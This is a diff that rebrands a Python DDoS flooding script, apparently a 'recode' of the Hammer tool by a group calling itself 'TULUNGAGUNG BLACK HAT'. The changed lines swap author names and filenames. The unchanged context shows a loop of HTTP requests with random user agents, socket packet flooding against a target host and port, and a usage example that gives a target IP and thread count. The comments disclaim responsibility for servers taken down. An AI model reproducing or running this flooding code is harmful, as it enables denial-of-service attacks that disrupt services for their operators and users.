@@ -3,7 +3,7 @@
 
 #Script Ini Recode Dari Hammer
 #Saya Tidak Bertanggung jawab Atas Downnya Suatu Server
-#Recode By : 4N4M F4K3 SM1L3
+#Recode By : uchil404
 #Team : TULUNGAGUNG BLACK HAT
 
 
@@ -36,7 +36,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94m4N4M Bucin in Target...\033[0m")
+			print("\033[94muchil404 Bucin in Target...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -50,7 +50,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--4N4M Baperin Target!--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--uchil404 Baperin Target!--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mBerhenti<->ah\033[0m")
@@ -86,8 +86,8 @@ def usage():
         Script Ini Recode Dari Script Hammer :)
         Saya Tidak Tanggung Jawab Atas Bapernya Suatu Target :)
         Team : TULUNGAGUNG BLACK HAT
-        cara pakai : python3 4N4MDDOS.py [-s] [-p] [-t]
-	contoh : python3 4N4MDDOS.py -s 192.168.0.1 -p 80 -t 135	
+        cara pakai : python3 uchil404-ddos.py [-s] [-p] [-t]
+	contoh : python3 uchil404-ddos.py -s 192.168.0.1 -p 80 -t 135	
 	-h : help
 	-s : alamat ip target
 	-p : port target, contoh 80
@@ -140,7 +140,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94m4N4M BUCIN Sedang Mengecek...\033[0m")
+	print("\033[94muchil404 BUCIN Sedang Mengecek...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
